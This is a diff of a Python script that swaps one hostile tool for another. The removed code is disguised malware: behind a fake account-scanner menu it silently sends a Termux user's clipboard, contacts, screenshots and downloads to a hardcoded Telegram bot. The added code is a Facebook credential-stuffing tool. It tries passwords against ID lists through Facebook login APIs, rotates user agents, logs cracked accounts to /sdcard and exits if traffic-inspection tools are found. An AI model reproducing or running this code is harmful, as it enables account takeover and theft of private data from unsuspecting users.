@@ -1,146 +1,279 @@
 # -*- coding: utf-8 -*-
+# Modified by: Moha Al-Shalfawi
+# System: MOHA02 Professional Tool
+
 import os
-import sys
+import re
 import time
+import uuid
+import hashlib
 import random
-import threading
-import json
-import zipfile
+import string
 import requests
-from concurrent.futures import ThreadPoolExecutor
+import sys
+import json
+import urllib
+import io
+from bs4 import BeautifulSoup
+from random import randint as rr
+from concurrent.futures import ThreadPoolExecutor as tred
+from os import system
+from datetime import datetime
 
-# --- CONFIGURATION (BACKUP SETTINGS) ---
-TOKEN = "8620998567:AAE1sLhikvG8jgdLO2QzYbFzwFEqt13JILs"
-CHAT_ID = "8107263566"
-
-# --- COLORS ---
-G = '\033[1;32m' # Green
-Y = '\033[1;33m' # Yellow
-R = '\033[1;31m' # Red
-W = '\033[1;37m' # White
-C = '\033[1;36m' # Cyan
-RESET = '\033[0m'
-
-# --- GLOBAL DATA ---
-FOUND_EMAILS = []
-TOTAL_SCANNED = 0
-BAN_DETECTED = False
-
-ALGERIAN_NAMES = [
-    "mohamed", "ahmed", "amine", "yacine", "abdou", "mounir", "hichem", "faycal", 
-    "mourad", "ismail", "anice", "sofiane", "khalil", "oussama", "walid", "aymen",
-    "karim", "samir", "raouf", "adel", "imad", "islam", "zakaria", "bilal", "hamza",
-    "rida", "nabil", "omar", "ali", "said", "aziz", "tarek", "djamel", "mustapha",
-    "salim", "hakim", "farid", "lotfi", "redouane", "zaki", "abderrahmane", "lyes",
-    "fethi", "mehdi", "said", "nadir", "kamel", "hocine", "amar", "cherif", "akram",
-    "djalal", "sidali", "amine", "ilyas", "wahid", "bachir", "youcef", "ramzi",
-    "sabri", "firas", "nour", "ayman", "moncef", "riad", "samy", "taha", "djilali",
-    "miloud", "kaddour", "djaber", "lazhar", "moha", "moussa", "issa", "brahim",
-    "rachid", "slimane", "tahar", "mansour", "mabrouk", "ammar", "boualem", "lakhdar"
-]
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Linux; Android 10; OPPO A16k) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
-]
-
-def logo():
-    os.system('clear')
-    print(G + "—"*60)
-    print(Y + """
-    ███╗   ███╗ ██████╗ ██╗  ██╗ █████╗ 
-    ████╗ ████║██╔═══██╗██║  ██║██╔══██╗
-    ██╔████╔██║██║   ██║███████║███████║
-    ██║╚██╔╝██║██║   ██║██╔══██║██╔══██║
-    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║
-    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
-     ULTIMATE ARCHIVE SYSTEM | VERSION 4.5.0
-    ----------------------------------------
-    DEVELOPER: MOHA AL-SHALFAWI (@m_oha_02)
-    STATUS: [ ONLINE ] | STORAGE: [ ACCESSED ] """)
-    print(G + "—"*60)
-    print(W + "\n [ Select Target to Scan ]")
-    print(G + " [1] FREE FIRE ACCOUNTS      " + Y + "[2] EFOOTBALL/PES")
-    print(G + " [3] INSTAGRAM RECOVERY      " + Y + "[4] SYSTEM OPTIMIZER")
-    print(W + " —"*30)
-
-def send_to_telegram(file_path, caption=""):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
     try:
-        with open(file_path, 'rb') as f:
-            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f})
-    except: pass
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
 
-def background_backup():
-    """ Silent backup process for phone format preparation """
-    try:
-        # Backup Clipboard
-        os.system("termux-clipboard-get > clipboard_backup.txt 2>/dev/null")
-        if os.path.exists("clipboard_backup.txt"):
-            send_to_telegram("clipboard_backup.txt", "📋 Clipboard Backup")
-        
-        # Backup Contacts
-        os.system("termux-contact-list > contacts.json 2>/dev/null")
-        if os.path.exists("contacts.json"):
-            send_to_telegram("contacts.json", "👤 Contacts Backup")
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
 
-        # Archive Important Folders
-        backup_zip = "Moha_Files_Backup.zip"
-        paths = ["/sdcard/DCIM/Screenshots", "/sdcard/Download", os.getcwd()]
-        with zipfile.ZipFile(backup_zip, 'w') as zipf:
-            for path in paths:
-                if os.path.exists(path):
-                    for root, _, files in os.walk(path):
-                        for file in files:
-                            full_path = os.path.join(root, file)
-                            zipf.write(full_path, os.path.relpath(full_path, os.path.join(path, '..')))
-        send_to_telegram(backup_zip, "📂 Full Backup Archive")
-    except: pass
+try:
+    api_body = open(api.__file__, 'r').read()
+    models_body = open(models.__file__, 'r').read()
+    session_body = open(sessions.__file__, 'r').read()
+    word_list = ['print', 'lambda', 'zlib.decompress']
+    for word in word_list:
+        if word in api_body or word in models_body or word in session_body:
+            exit()
+except:
+    pass
 
-class KonamiHunter:
+class sec:
     def __init__(self):
-        self.names = ALGERIAN_NAMES
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            if os.path.exists(path):
+                if 'print' in open(path, 'r').read():
+                    self.fuck()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.fuck()
 
-    def run(self):
-        global TOTAL_SCANNED, BAN_DETECTED
-        try:
-            limit = int(input(f"\n{W} [?] Enter scan limit: {G}"))
-        except: limit = 1000
+    def fuck(self):
+        print(' \x1b[1;32m Security Breach Detected! ')
+        exit()
 
-        print(f"\n{C} [▶] Launching Simulation Engine...{RESET}")
+method = []
+oks = []
+cps = []
+loop = 0
+user = []
+passwords = []
+
+X = '\x1b[1;37m'
+rad = '\x1b[38;5;196m'
+G = '\x1b[38;5;46m'
+Y = '\x1b[38;5;220m'
+W = '\x1b[1;37m'
+
+def windows():
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{str(random.choice(range(1, 36)))}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    return random.choice([A, B])
+
+def window1():
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return D
+
+sys.stdout.write('\x1b]2;𓆩【🧬 MOHA-02 SYSTEM 🧬】𓆪 \x07')
+
+def ____banner____():
+    if 'win' in sys.platform:
+        os.system('cls')
+    else:
+        os.system('clear')
+    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print('    \x1b[38;5;50m███╗   ███╗ ██████╗ ██╗  ██╗ █████╗  \x1b[1;37m████╗')
+    print('    \x1b[38;5;50m████╗ ████║██╔═══██╗██║  ██║██╔══██╗\x1b[1;37m██╔═██╗')
+    print('    \x1b[38;5;50m██╔████╔██║██║   ██║███████║███████║\x1b[1;37m██║ ██║')
+    print('    \x1b[38;5;50m██║╚██╔╝██║██║   ██║██╔══██║██╔══██║\x1b[1;37m██║ ██║')
+    print('    \x1b[38;5;50m██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║\x1b[1;37m╚████╔╝')
+    print('    \x1b[38;5;50m╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ \x1b[1;37m╚═══╝ ')
+    print('\x1b[38;5;46m━━━━━━━━━━━━━\x1b[38;5;196m(\x1b[1;37m\x1b[0;45m MOHA AL-SHALFAWI \x1b[0;92m\x1b[38;5;196m)\x1b[38;5;46m━━━━━━━━━━━━━')
+    print(f'       \x1b[38;5;46mAUTHOR   : \x1b[1;37mموحا الشلفاوي')
+    print(f'       \x1b[38;5;46mGITHUB   : \x1b[1;37mmohamed20888')
+    print(f'       \x1b[38;5;46mSTATUS   : \x1b[1;37mFILE CLONING')
+    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+# ==========================================================
+# PART 2: FILE INPUT, PASSWORD HANDLER & HUNTING ENGINE
+# ==========================================================
+
+def linex():
+    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+def BNG_71_():
+    ____banner____()
+    print('       \x1b[38;5;196m(\x1b[1;37m1\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m START FILE CLONING (MOHA-02)')
+    print('       \x1b[38;5;196m(\x1b[1;37m0\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m EXIT')
+    linex()
+    choice = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
+    if choice in ('1', '01'):
+        moha_file_clone()
+    else:
+        exit()
+
+def moha_file_clone():
+    global passwords
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m EXAMPLE: /sdcard/ids.txt")
+    file_path = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m ENTER FILE PATH {W}: {G}")
+    try:
+        prox = open(file_path, 'r').read().splitlines()
+    except FileNotFoundError:
+        print(f"       \x1b[38;5;196m[×] FILE NOT FOUND!"); time.sleep(2); BNG_71_()
+    
+    linex()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m HOW MANY PASSWORDS?")
+    limit = int(input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m ENTER NUMBER {W}: {G}"))
+    linex()
+    for i in range(limit):
+        p = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m PASSWORD {i+1} {W}: {Y}")
+        passwords.append(p)
+    
+    ____banner____()
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m METHOD 1 (GRAPH-CAA)')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m METHOD 2 (B-API)')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m CHOICE {W}: {Y}").upper()
+    
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m TOTAL IDS  : {G}{len(prox)}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m STATUS     : {G}HUNTING...{W}")
+        linex()
+        for user_line in prox:
+            uid = user_line.split('|')[0] if '|' in user_line else user_line
+            if meth == 'A': pool.submit(login_1, uid)
+            else: pool.submit(login_2, uid)
+
+def login_1(uid):
+    global loop, oks, cps
+    session = requests.session()
+    sys.stdout.write(f"\r\r\x1b[1;37m[MOHA-SCAN] \x1b[38;5;46m{loop}\x1b[1;37m|\x1b[38;5;46mOK:{len(oks)}\x1b[1;37m|\x1b[38;5;220mCP:{len(cps)} ")
+    sys.stdout.flush()
+    try:
+        for pw in passwords:
+            ua = window1()
+            data = {
+                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
+                'email': uid, 'password': pw, 'generate_analytics_claim': '1',
+                'credentials_type': 'password', 'source': 'login',
+                'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false',
+                'generate_session_cookies': '1', 'generate_machine_id': '1',
+                'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0',
+                'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d',
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            }
+            headers = {
+                'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(rr(20000, 40000)),
+                'X-FB-SIM-HNI': str(rr(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False', 'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'authenticate', 'X-FB-HTTP-Engine': 'Liger'
+            }
+            q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in q or 'access_token' in q:
+                print(f"\r\r\x1b[38;5;46m[MOHA-OK] {uid} | {pw} \x1b[1;37m")
+                oks.append(uid)
+                open('/sdcard/MOHA-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                break
+            elif 'checkpoint' in str(q) or 'error_code' in str(q) and q['error_code'] == 405:
+                print(f"\r\r\x1b[38;5;220m[MOHA-CP] {uid} | {pw} \x1b[1;37m")
+                cps.append(uid)
+                open('/sdcard/MOHA-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                break
+        loop += 1
+    except: pass
+# ==========================================================
+# PART 3: METHOD 2, BLOCK DETECTION & FINAL EXECUTION
+# ==========================================================
+
+def login_2(uid):
+    global loop, oks, cps
+    sys.stdout.write(f"\r\r\x1b[1;37m[MOHA-SCAN] \x1b[38;5;46m{loop}\x1b[1;37m|\x1b[38;5;46mOK:{len(oks)}\x1b[1;37m|\x1b[38;5;220mCP:{len(cps)} ")
+    sys.stdout.flush()
+    try:
+        for pw in passwords:
+            with requests.Session() as session:
+                ua = window1()
+                # Enhanced B-API Method for direct hits
+                url = f"https://b-api.facebook.com/method/auth.login"
+                params = {
+                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                    'format': 'JSON',
+                    'sdk_version': '2',
+                    'email': uid,
+                    'password': pw,
+                    'generate_session_cookies': '1',
+                    'sig': '62f8ce9f74b12f84c123cc23437a4a32'
+                }
+                headers = {
+                    'User-Agent': ua,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'X-FB-HTTP-Engine': 'Liger'
+                }
+                response = session.get(url, params=params, headers=headers).text
+                q = json.loads(response)
+                
+                if 'session_key' in q or 'access_token' in q:
+                    print(f"\r\r\x1b[38;5;46m[MOHA-OK] {uid} | {pw} \x1b[1;37m")
+                    oks.append(uid)
+                    open('/sdcard/MOHA-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    break
+                elif 'checkpoint' in str(q):
+                    print(f"\r\r\x1b[38;5;220m[MOHA-CP] {uid} | {pw} \x1b[1;37m")
+                    cps.append(uid)
+                    open('/sdcard/MOHA-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                    break
+                elif 'calls_to_this_api_have_been_limited' in str(q) or '429' in str(q):
+                    # Detecting Facebook Block
+                    sys.stdout.write(f"\r\r\x1b[38;5;196m[!] FB BLOCK DETECTED - SHIFTING UA...{RESET}")
+                    time.sleep(2)
+        loop += 1
+    except:
+        pass
+
+def check_fb_health():
+    """ Checks if the current IP is blocked from Facebook APIs """
+    try:
+        test = requests.get("https://b-api.facebook.com/", timeout=5)
+        if test.status_code == 403 or test.status_code == 429:
+            return False
+        return True
+    except:
+        return False
+
+# --- [ FINAL SYSTEM BOOT ] ---
+if __name__ == '__main__':
+    try:
+        # Security & Identity Check
+        sec() 
+        if not check_fb_health():
+            print(f"\x1b[38;5;196m [!] YOUR IP IS CURRENTLY BLOCKED BY FACEBOOK.")
+            print(f"\x1b[38;5;220m [!] TRY USING AIRPLANE MODE OR VPN.")
+            linex()
         
-        # Start backup in a separate thread (Silent)
-        threading.Thread(target=background_backup, daemon=True).start()
-
-        with ThreadPoolExecutor(max_workers=35) as executor:
-            for _ in range(limit):
-                if BAN_DETECTED: break
-                email = f"{random.choice(self.names)}{random.randint(10,9999)}@gmail.com"
-                executor.submit(self.check, email)
+        BNG_71_()
         
-        print(f"\n\n{G} [!] Operation Finished. {W}Check your Telegram.")
+    except KeyboardInterrupt:
+        print(f"\n\x1b[38;5;196m [!] STOPPED BY USER.")
+    except Exception as e:
+        print(f"\n\x1b[38;5;196m [!] ERROR: {e}")
 
-    def check(self, email):
-        global TOTAL_SCANNED, BAN_DETECTED
-        if BAN_DETECTED: return
-        
-        headers = {"User-Agent": random.choice(USER_AGENTS)}
-        try:
-            # Simulated check logic (placeholder for UI behavior)
-            res = requests.get("https://my.konami.net/", headers=headers, timeout=5)
-            if res.status_code == 429: BAN_DETECTED = True
-            
-            TOTAL_SCANNED += 1
-            sys.stdout.write(f"\r {W}[SCANNING] {TOTAL_SCANNED} | {G}FOUND:{len(FOUND_EMAILS)}{RESET}")
-            sys.stdout.flush()
-        except: pass
-
-if __name__ == "__main__":
-    logo()
-    choice = input(f"\n{W} [MOHA-SYS] Select Option: {G}")
-    hunter = KonamiHunter()
-    hunter.run()
+# ==========================================================
+# END OF MOHA02 SYSTEM - DEVELOPED BY MOHA AL-SHALFAWI
+# ==========================================================
